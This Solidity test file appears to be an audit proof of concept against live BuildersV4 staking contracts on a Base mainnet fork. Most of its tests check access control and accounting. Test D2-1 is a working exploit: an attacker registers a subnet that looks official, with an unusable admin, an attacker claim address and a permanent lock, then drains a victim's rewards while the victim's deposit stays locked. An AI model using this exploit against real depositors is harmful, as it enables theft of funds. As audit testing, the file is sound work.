// SPDX-License-Identifier: MIT
// Round-2 PoC — BuildersV4 / TreasuryV2 / RewardPool / FeeConfig (Base, Appendix A)
// Fork: Base mainnet, pinned block 58_020_029, RPC base-rpc.publicnode.com.
// NO privileged accounts: attacker / victim / admins are fresh keys (except where
// a test explicitly demonstrates a PRIVILEGED-only mechanic and labels it so);
// MOR is dealt to the victim via cheatcode (as in prior PoCs in this repo).
//
// Candidates under test:
//  D2-1  K-13 EXTENSION (positive): admin = a LIVE, well-known CONTRACT that can
//        never act (the MOR token itself) + claimAdmin = attacker + lock = max.
//        Stronger lure than the 0xdead variant (admin looks maximally official),
//        same root cause as K-13 (no msg.sender == admin check in createSubnet),
//        same fix. NOT a new finding — reported as a K-13 extension.
//  D2-2  (negative) claimAdmin CANNOT edit a subnet (editSubnet/editSubnetMetadata).
//  D2-3  (negative) subnetsData[0]: deposited/pending are 0 and user flows
//        never write the slot (snapshot-identical before/after); its rate
//        holds a stale value from an owner setNetworkShare call — harmless
//        because deposited[0] == 0 makes pending[0] == 0 and id-0 calls revert.
//  D2-4  (negative) createSubnet validation boundaries: admin/claimAdmin == 0,
//        empty name, lock < minimal all revert.
//  D2-5  (negative) minimalDeposit = 0 / 1 wei: 1-wei deposits accrue ~0, withdraw
//        works, no amplification.
//  D2-6  (negative) editSubnetMetadata is admin-only and has no economic effect;
//        metadata strings are arbitrary (lure vector for K-13, not a vuln alone).
//  D2-7  (negative) FeeConfig: all setters owner-only; live claim fee is 0 and
//        create-op fee is 0; Treasury.sendRewards is builders-only.
//  D2-8  (measurement) treasury deficit at the fork block (operational, K-10).
//  D2-9  (PRIVILEGED mechanics demo, NOT a finding) admin transfer via editSubnet
//        is unilateral + instant, no acceptance step; old admin loses power at once.
//  D2-10 (negative) admin-vs-claimAdmin claim race: first claimer takes all,
//        second reverts; no double-claim; receiver may be arbitrary (by design).
//  D2-11 (PRIVILEGED mechanics demo, NOT a finding) admin raising minimalDeposit
//        blocks partial withdraw only; full withdraw still works (K-18 re-confirm).
//  D2-12 (measurement) Treasury/BuildersV4 accounting reconciles exactly on claim.
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

struct Subnet {
    string name;
    address admin;
    uint128 unused1;
    uint128 withdrawLockPeriodAfterDeposit;
    uint128 unused2;
    uint256 minimalDeposit;
    address claimAdmin;
}

struct SubnetMetadata {
    string slug;
    string description;
    string website;
    string image;
}

interface IBuildersV4 {
    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function editSubnetMetadata(bytes32 subnetId_, SubnetMetadata calldata metadata_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function claim(bytes32 subnetId_, address receiver_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function getCurrentSubnetRewards(bytes32 subnetId_) external view returns (uint256);
    function getCurrentSubnetsRewards() external view returns (uint256);
    function minimalWithdrawLockPeriod() external view returns (uint256);
    function subnets(bytes32 subnetId_)
        external
        view
        returns (
            string memory name,
            address admin,
            uint128 unused1,
            uint128 withdrawLockPeriodAfterDeposit,
            uint128 unused2,
            uint256 minimalDeposit,
            address claimAdmin
        );
    function subnetsData(bytes32 subnetId_)
        external
        view
        returns (uint128 unused1, uint256 deposited, uint256 unused2, uint256 rate, uint256 pendingRewards);
    function subnetsMetadata(bytes32 subnetId_)
        external
        view
        returns (string memory slug, string memory description, string memory website, string memory image);
    function allSubnetsDataV4()
        external
        view
        returns (uint256 distributedRewards, uint256 undistributedRewards, uint256 claimedRewards, uint128 lastUpdate);
    function setNetworkShare(uint256 networkShare_) external;
}

interface IFeeConfig {
    function setFee(address sender_, uint256 fee_) external;
    function setFeeForOperation(address sender_, bytes32 operation_, uint256 fee_) external;
    function setTreasury(address treasury_) external;
    function setBaseFee(uint256 baseFee_) external;
    function setBaseFeeForOperation(bytes32 operation_, uint256 fee_) external;
    function discardCustomFee(address sender_, bytes32 operation_) external;
    function getFeeAndTreasuryForOperation(address sender_, bytes32 operation_)
        external
        view
        returns (uint256 fee, address treasury);
}

interface IBuildersTreasuryV2 {
    function sendRewards(address receiver_, uint256 amount_) external;
    function distributedRewards() external view returns (uint256);
}

contract BuildersDeep2Test is Test {
    IBuildersV4 internal constant BUILDERS = IBuildersV4(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9);
    IERC20 internal constant MOR = IERC20(0x7431aDa8a591C955a994a21710752EF9b882b8e3);
    IFeeConfig internal constant FEE_CONFIG = IFeeConfig(0x845FBB4B3e2207BF03087b8B94D2430AB11088eE);
    IBuildersTreasuryV2 internal constant TREASURY =
        IBuildersTreasuryV2(0x9eba628581896ce086cb8f1A513ea6097A8FC561);

    bytes32 internal constant FEE_CLAIM_OPERATION = "claim";
    bytes32 internal constant FEE_SUBNET_CREATE = "buildersV4.fee.subnet.create";

    address internal attacker = makeAddr("attacker2");
    address internal victim = makeAddr("victim2");
    address internal adminA = makeAddr("subnetAdminA");
    address internal claimC = makeAddr("subnetClaimC");

    function setUp() public {
        vm.createSelectFork("https://base-rpc.publicnode.com", 58_020_029);
    }

    function _meta() internal pure returns (SubnetMetadata memory) {
        return SubnetMetadata("", "", "", "");
    }

    function _fundAndDeposit(address user_, bytes32 id_, uint256 amount_) internal {
        deal(address(MOR), user_, amount_);
        vm.startPrank(user_);
        MOR.approve(address(BUILDERS), amount_);
        BUILDERS.deposit(id_, amount_);
        vm.stopPrank();
    }

    // ---- D2-1: K-13 extension — admin is a LIVE contract that can never act ----
    // admin = MOR token itself (a well-known, official-looking address with code
    // but no function that could ever call editSubnet/claim). claimAdmin =
    // attacker, lock = max. Victim stakes -> attacker drains, nobody can fix.
    function test_D21_ContractAdmin_LooksOfficialButCanNeverAct() public {
        address morToken = address(MOR);
        assertGt(morToken.code.length, 0, "MOR token must be a live contract");

        Subnet memory s = Subnet({
            name: "OfficialLooking",
            admin: morToken,
            unused1: 0,
            withdrawLockPeriodAfterDeposit: type(uint128).max,
            unused2: 0,
            minimalDeposit: 1,
            claimAdmin: attacker
        });
        vm.prank(attacker);
        BUILDERS.createSubnet(s, _meta());
        bytes32 id = BUILDERS.getSubnetId("OfficialLooking");

        (, address admin_, , uint128 lock_, , , address claimAdmin_) = BUILDERS.subnets(id);
        assertEq(admin_, morToken, "admin must be the MOR token contract");
        assertEq(claimAdmin_, attacker, "claimAdmin must be the attacker");
        assertEq(lock_, type(uint128).max, "lock must be max");

        _fundAndDeposit(victim, id, 100_000 ether);
        vm.warp(block.timestamp + 1 days);
        uint256 pending = BUILDERS.getCurrentSubnetRewards(id);
        assertGt(pending, 50 ether, "subnet must accrue material rewards in 1 day");

        uint256 before = MOR.balanceOf(attacker);
        vm.prank(attacker);
        BUILDERS.claim(id, attacker);
        uint256 stolen = MOR.balanceOf(attacker) - before;
        console.log("D2-1 rewards diverted to attacker (MOR):", stolen / 1 ether);
        assertEq(stolen, pending, "attacker must receive the full pending rewards");

        // Victim principal locked forever.
        vm.expectRevert();
        vm.prank(victim);
        BUILDERS.withdraw(id, 100_000 ether);

        // Nobody can edit: attacker, victim, random third party all revert.
        // (The admin contract itself has no BuildersV4-calling function at all:
        // MOR OFT exposes only mint/burn/transfer/bridge — no arbitrary call —
        // so no party, including the MOR owner multisig, can make it edit.)
        vm.expectRevert("BU: not the Subnet owner");
        vm.prank(attacker);
        BUILDERS.editSubnet(id, s);
        vm.expectRevert("BU: not the Subnet owner");
        vm.prank(victim);
        BUILDERS.editSubnet(id, s);
        vm.expectRevert("BU: not the Subnet owner");
        vm.prank(makeAddr("random2"));
        BUILDERS.editSubnet(id, s);
    }

    // ---- D2-2: claimAdmin cannot edit ------------------------------------------
    function test_D22_ClaimAdminCannotEdit() public {
        Subnet memory s = Subnet({
            name: "LegitSubnet",
            admin: adminA,
            unused1: 0,
            withdrawLockPeriodAfterDeposit: 604800,
            unused2: 0,
            minimalDeposit: 1 ether,
            claimAdmin: claimC
        });
        vm.prank(adminA);
        BUILDERS.createSubnet(s, _meta());
        bytes32 id = BUILDERS.getSubnetId("LegitSubnet");

        // claimAdmin is NOT the subnet owner for edits.
        vm.expectRevert("BU: not the Subnet owner");
        vm.prank(claimC);
        BUILDERS.editSubnet(id, s);
        vm.expectRevert("BU: not the Subnet owner");
        vm.prank(claimC);
        BUILDERS.editSubnetMetadata(id, _meta());

        // ...but claimAdmin CAN claim (by design), to an arbitrary receiver.
        _fundAndDeposit(victim, id, 10_000 ether);
        vm.warp(block.timestamp + 1 days);
        uint256 pending = BUILDERS.getCurrentSubnetRewards(id);
        assertGt(pending, 1 ether, "must accrue rewards");
        address receiver = makeAddr("receiver2");
        vm.prank(claimC);
        BUILDERS.claim(id, receiver);
        assertEq(MOR.balanceOf(receiver), pending, "claimAdmin claim must pay receiver in full");
    }

    // ---- D2-3: subnetsData[0] is fully inert ------------------------------------
    // NOTE (live behaviour, corrected after first run): subnetsData[0].rate is
    // NOT 0 on mainnet — it is 6.98e24, a stale write from an owner call to
    // setNetworkShare, which settles via _updatePoolData(bytes32(0),...). The
    // rate value itself is harmless: deposited[0] is 0, so pending[0] stays 0
    // and id-0 rewards are 0. What matters is that USER flows never write
    // slot 0 at all — asserted below by snapshotting the whole slot.
    function test_D23_SubnetIdZeroIsInert() public {
        // Snapshot the whole slot-0 record first.
        (uint128 u1a, uint256 depa, uint256 u2a, uint256 ratea, uint256 penda) = BUILDERS
            .subnetsData(bytes32(0));
        assertEq(depa, 0, "slot0 deposited must be 0");
        assertEq(penda, 0, "slot0 pending must be 0");
        assertEq(BUILDERS.getCurrentSubnetRewards(bytes32(0)), 0, "id 0 must have 0 rewards");
        console.log("D2-3 slot0 rate (stale setNetworkShare write):", ratea);

        // Calls with id 0 revert (subnet does not exist: admin == 0).
        vm.expectRevert("BU: the Subnet doesn't exist");
        vm.prank(victim);
        BUILDERS.deposit(bytes32(0), 1 ether);
        vm.expectRevert("BU: the Subnet doesn't exist");
        vm.prank(victim);
        BUILDERS.withdraw(bytes32(0), 1 ether);
        vm.expectRevert("BU: the Subnet doesn't exist");
        vm.prank(attacker);
        BUILDERS.claim(bytes32(0), attacker);

        // User flows never write slot 0: full deposit + claim + withdraw cycle
        // on a real subnet, then re-check slot 0 is bit-identical.
        Subnet memory s = Subnet({
            name: "SlotZeroProbe",
            admin: adminA,
            unused1: 0,
            withdrawLockPeriodAfterDeposit: 604800,
            unused2: 0,
            minimalDeposit: 1 ether,
            claimAdmin: adminA
        });
        vm.prank(adminA);
        BUILDERS.createSubnet(s, _meta());
        bytes32 id = BUILDERS.getSubnetId("SlotZeroProbe");
        _fundAndDeposit(victim, id, 50_000 ether);
        vm.warp(block.timestamp + 1 days);
        vm.prank(adminA);
        BUILDERS.claim(id, adminA);
        vm.warp(block.timestamp + 7 days);
        vm.prank(victim);
        BUILDERS.withdraw(id, 50_000 ether);

        (uint128 u1b, uint256 depb, uint256 u2b, uint256 rateb, uint256 pendb) = BUILDERS
            .subnetsData(bytes32(0));
        assertEq(u1b, u1a, "slot0 unused1 must be untouched by user flows");
        assertEq(depb, depa, "slot0 deposited must be untouched by user flows");
        assertEq(u2b, u2a, "slot0 unused2 must be untouched by user flows");
        assertEq(rateb, ratea, "slot0 rate must be untouched by user flows");
        assertEq(pendb, penda, "slot0 pending must be untouched by user flows");
        assertEq(BUILDERS.getCurrentSubnetRewards(bytes32(0)), 0, "id 0 rewards must stay 0");
    }

    // ---- D2-4: createSubnet validation boundaries -------------------------------
    // NOTE: first version used copy-mutate on one `base` struct and the
    // claimAdmin case reverted with the admin message instead; rewritten with
    // a fresh literal per case so each check is isolated.
    function _probeSubnet() internal view returns (Subnet memory) {
        return
            Subnet({
                name: "ValidProbe",
                admin: adminA,
                unused1: 0,
                withdrawLockPeriodAfterDeposit: uint128(BUILDERS.minimalWithdrawLockPeriod()),
                unused2: 0,
                minimalDeposit: 1,
                claimAdmin: adminA
            });
    }

    function test_D24_CreateSubnetValidation() public {
        uint256 minLock = BUILDERS.minimalWithdrawLockPeriod();

        Subnet memory badAdmin = _probeSubnet();
        badAdmin.admin = address(0);
        vm.expectRevert("BU: invalid admin address");
        vm.prank(attacker);
        BUILDERS.createSubnet(badAdmin, _meta());

        Subnet memory badClaim = _probeSubnet();
        badClaim.claimAdmin = address(0);
        vm.expectRevert("BU: invalid claim admin address");
        vm.prank(attacker);
        BUILDERS.createSubnet(badClaim, _meta());

        Subnet memory badName = _probeSubnet();
        badName.name = "";
        vm.expectRevert("BU: invalid project name");
        vm.prank(attacker);
        BUILDERS.createSubnet(badName, _meta());

        Subnet memory badLock = _probeSubnet();
        badLock.withdrawLockPeriodAfterDeposit = uint128(minLock - 1);
        vm.expectRevert("BU: invalid withdraw lock period");
        vm.prank(attacker);
        BUILDERS.createSubnet(badLock, _meta());

        // The valid shape succeeds (proves the reverts above are the checks,
        // not a broken test setup).
        vm.prank(attacker);
        BUILDERS.createSubnet(_probeSubnet(), _meta());
        (, address admin_, , , , ,) = BUILDERS.subnets(BUILDERS.getSubnetId("ValidProbe"));
        assertEq(admin_, adminA, "valid subnet must be created");
    }

    // ---- D2-5: minimalDeposit 0 / 1 wei -----------------------------------------
    function test_D25_MinimalDepositZeroAndOneWei() public {
        Subnet memory s = Subnet({
            name: "DustSubnet",
            admin: adminA,
            unused1: 0,
            withdrawLockPeriodAfterDeposit: 604800,
            unused2: 0,
            minimalDeposit: 0,
            claimAdmin: adminA
        });
        vm.prank(adminA);
        BUILDERS.createSubnet(s, _meta());
        bytes32 id = BUILDERS.getSubnetId("DustSubnet");

        // 1-wei deposit works with minimalDeposit 0...
        deal(address(MOR), victim, 1);
        vm.startPrank(victim);
        MOR.approve(address(BUILDERS), 1);
        BUILDERS.deposit(id, 1);
        vm.stopPrank();

        // ...accrues nothing measurable even after 30 days (no amplification).
        vm.warp(block.timestamp + 30 days);
        assertEq(BUILDERS.getCurrentSubnetRewards(id), 0, "1 wei must accrue 0 rewards");

        // ...and withdraws cleanly after the lock.
        vm.prank(victim);
        BUILDERS.withdraw(id, 1);
        assertEq(MOR.balanceOf(victim), 1, "1 wei must be recoverable in full");
    }

    // ---- D2-6: editSubnetMetadata is admin-only, no economic effect ------------
    function test_D26_EditMetadataAdminOnlyNoEconomicEffect() public {
        Subnet memory s = Subnet({
            name: "MetaSubnet",
            admin: adminA,
            unused1: 0,
            withdrawLockPeriodAfterDeposit: 604800,
            unused2: 0,
            minimalDeposit: 1 ether,
            claimAdmin: adminA
        });
        vm.prank(adminA);
        BUILDERS.createSubnet(s, _meta());
        bytes32 id = BUILDERS.getSubnetId("MetaSubnet");
        _fundAndDeposit(victim, id, 10_000 ether);
        vm.warp(block.timestamp + 1 days);
        uint256 pendingBefore = BUILDERS.getCurrentSubnetRewards(id);
        assertGt(pendingBefore, 1 ether, "must accrue rewards");

        // Non-admin cannot edit metadata (attacker, claimAdmin==admin here so
        // use a random third party + the victim staker).
        vm.expectRevert("BU: not the Subnet owner");
        vm.prank(attacker);
        BUILDERS.editSubnetMetadata(id, SubnetMetadata("x", "y", "https://evil.example", "z"));
        vm.expectRevert("BU: not the Subnet owner");
        vm.prank(victim);
        BUILDERS.editSubnetMetadata(id, SubnetMetadata("x", "y", "https://evil.example", "z"));

        // Admin CAN set arbitrary strings (incl. a phishing URL) — lure vector
        // for K-13, but metadata alone moves no funds: pending is unchanged.
        vm.prank(adminA);
        BUILDERS.editSubnetMetadata(
            id, SubnetMetadata("slug", "desc", "https://evil.example", "img")
        );
        (, , string memory website, ) = BUILDERS.subnetsMetadata(id);
        assertEq(website, "https://evil.example", "admin metadata write must stick");
        assertEq(
            BUILDERS.getCurrentSubnetRewards(id),
            pendingBefore,
            "metadata edit must not change pending rewards"
        );
    }

    // ---- D2-7: FeeConfig + Treasury access control, live fees are 0 -------------
    function test_D27_FeeConfigAndTreasuryAccessControl() public {
        // Live fees at the fork block: claim fee 0, subnet-create fee 0.
        (uint256 claimFee, address claimTreasury) = FEE_CONFIG.getFeeAndTreasuryForOperation(
            address(BUILDERS),
            FEE_CLAIM_OPERATION
        );
        assertEq(claimFee, 0, "live claim fee must be 0");
        assertEq(
            claimTreasury,
            0x68700f67Eb19722f8051f072264E979ae4c03c3F,
            "claim fee treasury must be the known FeeConfig treasury"
        );
        (uint256 createFee, ) = FEE_CONFIG.getFeeAndTreasuryForOperation(
            address(BUILDERS),
            FEE_SUBNET_CREATE
        );
        assertEq(createFee, 0, "live subnet-create fee must be 0");

        // Every FeeConfig setter reverts for a non-owner (all are onlyOwner).
        vm.expectRevert();
        vm.prank(attacker);
        FEE_CONFIG.setFee(address(BUILDERS), 5e24);
        vm.expectRevert();
        vm.prank(attacker);
        FEE_CONFIG.setFeeForOperation(address(BUILDERS), FEE_CLAIM_OPERATION, 5e24);
        vm.expectRevert();
        vm.prank(attacker);
        FEE_CONFIG.setTreasury(attacker);
        vm.expectRevert();
        vm.prank(attacker);
        FEE_CONFIG.setBaseFee(5e24);
        vm.expectRevert();
        vm.prank(attacker);
        FEE_CONFIG.setBaseFeeForOperation(FEE_CLAIM_OPERATION, 5e24);
        vm.expectRevert();
        vm.prank(attacker);
        FEE_CONFIG.discardCustomFee(address(BUILDERS), FEE_CLAIM_OPERATION);

        // Treasury.sendRewards reverts for anyone but BuildersV4.
        vm.expectRevert("BT: the caller isn't the `BuildersV4`");
        vm.prank(attacker);
        TREASURY.sendRewards(attacker, 1 ether);
    }

    // ---- D2-8: treasury deficit measurement (operational, K-10) -----------------
    function test_D28_TreasuryDeficitMeasurement() public {
        uint256 claimable = BUILDERS.getCurrentSubnetsRewards();
        uint256 treasuryBal = MOR.balanceOf(address(TREASURY));
        console.log("D2-8 claimable all subnets (MOR):", claimable / 1 ether);
        console.log("D2-8 treasury balance (MOR):", treasuryBal / 1 ether);
        console.log("D2-8 deficit (MOR):", (claimable - treasuryBal) / 1 ether);
        assertGt(claimable, treasuryBal, "deficit must still exist at fork block");
        assertGt(claimable - treasuryBal, 8000 ether, "deficit must still be >8,000 MOR");
    }

    // ---- D2-9: PRIVILEGED demo — admin transfer is unilateral + instant --------
    // Requires the CURRENT admin key, so this is NOT a finding (fails Q4).
    // It documents the mechanics: one editSubnet instantly moves admin AND
    // claimAdmin AND lock to attacker-chosen values; the old admin loses all
    // power at once. Consequence for K-13: the spoofed admin's reclaim is
    // equally unilateral — recovery is a race, not a guarantee.
    function test_D29_UnilateralAdminTransfer_PrivilegedOnly() public {
        Subnet memory s = Subnet({
            name: "TransferSubnet",
            admin: adminA,
            unused1: 0,
            withdrawLockPeriodAfterDeposit: 604800,
            unused2: 0,
            minimalDeposit: 1 ether,
            claimAdmin: adminA
        });
        vm.prank(adminA);
        BUILDERS.createSubnet(s, _meta());
        bytes32 id = BUILDERS.getSubnetId("TransferSubnet");
        _fundAndDeposit(victim, id, 100_000 ether);
        vm.warp(block.timestamp + 1 days);
        uint256 pendingBefore = BUILDERS.getCurrentSubnetRewards(id);
        assertGt(pendingBefore, 50 ether, "must accrue rewards");

        // Admin transfers EVERYTHING to the attacker in one tx, no acceptance.
        Subnet memory hostile = Subnet({
            name: "TransferSubnet",
            admin: attacker,
            unused1: 0,
            withdrawLockPeriodAfterDeposit: type(uint128).max,
            unused2: 0,
            minimalDeposit: 1,
            claimAdmin: attacker
        });
        vm.prank(adminA);
        BUILDERS.editSubnet(id, hostile);

        // Old admin instantly powerless.
        vm.expectRevert("BU: not the Subnet owner");
        vm.prank(adminA);
        BUILDERS.editSubnet(id, s);

        // Attacker (new admin + claimAdmin) drains the pending rewards.
        vm.prank(attacker);
        BUILDERS.claim(id, attacker);
        assertEq(MOR.balanceOf(attacker), pendingBefore, "new admin must drain pending");

        // Victim principal now locked by the max lock.
        vm.expectRevert();
        vm.prank(victim);
        BUILDERS.withdraw(id, 100_000 ether);
    }

    // ---- D2-10: admin-vs-claimAdmin claim race ----------------------------------
    function test_D210_ClaimRaceFirstTakesAllNoDoubleClaim() public {
        Subnet memory s = Subnet({
            name: "RaceSubnet",
            admin: adminA,
            unused1: 0,
            withdrawLockPeriodAfterDeposit: 604800,
            unused2: 0,
            minimalDeposit: 1 ether,
            claimAdmin: claimC
        });
        vm.prank(adminA);
        BUILDERS.createSubnet(s, _meta());
        bytes32 id = BUILDERS.getSubnetId("RaceSubnet");
        _fundAndDeposit(victim, id, 10_000 ether);
        vm.warp(block.timestamp + 1 days);
        uint256 pending = BUILDERS.getCurrentSubnetRewards(id);
        assertGt(pending, 1 ether, "must accrue rewards");

        // claimAdmin claims first -> takes everything, to an arbitrary receiver.
        address receiver = makeAddr("receiver2b");
        vm.prank(claimC);
        BUILDERS.claim(id, receiver);
        assertEq(MOR.balanceOf(receiver), pending, "first claimer must take all");
        assertEq(BUILDERS.getCurrentSubnetRewards(id), 0, "pending must be zeroed");

        // Admin's immediate second claim reverts: nothing left, no double-claim.
        vm.expectRevert("BU: nothing to claim");
        vm.prank(adminA);
        BUILDERS.claim(id, adminA);

        // Next day's accrual is claimable again, by either role.
        vm.warp(block.timestamp + 1 days);
        uint256 pending2 = BUILDERS.getCurrentSubnetRewards(id);
        assertGt(pending2, 1 ether, "day-2 rewards must accrue");
        vm.prank(adminA);
        BUILDERS.claim(id, adminA);
        assertEq(MOR.balanceOf(adminA), pending2, "admin must take day-2 rewards");
    }

    // ---- D2-11: PRIVILEGED demo — minimalDeposit raise traps partial withdraw ---
    // Requires the admin key: NOT a finding (fails Q4). Re-confirms K-18: full
    // withdraw still works, only partial withdraw is blocked.
    function test_D211_MinimalDepositRaise_PrivilegedOnly() public {
        Subnet memory s = Subnet({
            name: "MindepSubnet",
            admin: adminA,
            unused1: 0,
            withdrawLockPeriodAfterDeposit: 604800,
            unused2: 0,
            minimalDeposit: 1 ether,
            claimAdmin: adminA
        });
        vm.prank(adminA);
        BUILDERS.createSubnet(s, _meta());
        bytes32 id = BUILDERS.getSubnetId("MindepSubnet");
        _fundAndDeposit(victim, id, 100_000 ether);
        vm.warp(block.timestamp + 8 days); // past the 7-day lock

        // Admin raises minimalDeposit above the victim's deposit.
        Subnet memory raised = Subnet({
            name: "MindepSubnet",
            admin: adminA,
            unused1: 0,
            withdrawLockPeriodAfterDeposit: 604800,
            unused2: 0,
            minimalDeposit: 150_000 ether,
            claimAdmin: adminA
        });
        vm.prank(adminA);
        BUILDERS.editSubnet(id, raised);

        // Partial withdraw reverts (50k left < 150k minimum, != 0)...
        vm.expectRevert("BU: invalid withdraw amount");
        vm.prank(victim);
        BUILDERS.withdraw(id, 50_000 ether);
        // ...but full withdraw still succeeds (deposited == 0 allowed).
        vm.prank(victim);
        BUILDERS.withdraw(id, 100_000 ether);
        assertEq(MOR.balanceOf(victim), 100_000 ether, "full withdraw must still work");
    }

    // ---- D2-12: Treasury / BuildersV4 accounting reconciles on claim -----------
    function test_D212_ClaimAccountingReconciles() public {
        Subnet memory s = Subnet({
            name: "ReconSubnet",
            admin: adminA,
            unused1: 0,
            withdrawLockPeriodAfterDeposit: 604800,
            unused2: 0,
            minimalDeposit: 1 ether,
            claimAdmin: adminA
        });
        vm.prank(adminA);
        BUILDERS.createSubnet(s, _meta());
        bytes32 id = BUILDERS.getSubnetId("ReconSubnet");
        _fundAndDeposit(victim, id, 100_000 ether);
        vm.warp(block.timestamp + 1 days);
        uint256 pending = BUILDERS.getCurrentSubnetRewards(id);
        assertGt(pending, 50 ether, "must accrue rewards");

        (uint256 distBefore, , uint256 claimedBefore, ) = BUILDERS.allSubnetsDataV4();
        uint256 treasuryDistBefore = TREASURY.distributedRewards();
        uint256 treasuryBalBefore = MOR.balanceOf(address(TREASURY));

        vm.prank(adminA);
        BUILDERS.claim(id, adminA);

        (uint256 distAfter, , uint256 claimedAfter, ) = BUILDERS.allSubnetsDataV4();
        // Claim settles the day's accrual into distributedRewards first, so
        // claimed grows by exactly `pending` and distributed by >= pending.
        assertEq(claimedAfter - claimedBefore, pending, "claimedRewards must grow by exactly pending");
        assertGe(distAfter, distBefore, "distributedRewards must not decrease");
        assertEq(
            TREASURY.distributedRewards() - treasuryDistBefore,
            pending,
            "treasury distributedRewards must grow by exactly pending"
        );
        assertEq(
            treasuryBalBefore - MOR.balanceOf(address(TREASURY)),
            pending,
            "treasury balance must fall by exactly pending"
        );
        assertEq(MOR.balanceOf(adminA), pending, "admin must receive exactly pending (fee 0)");
        // Global invariant holds: distributed >= claimed.
        assertGe(distAfter, claimedAfter, "distributed must stay >= claimed");
    }
}
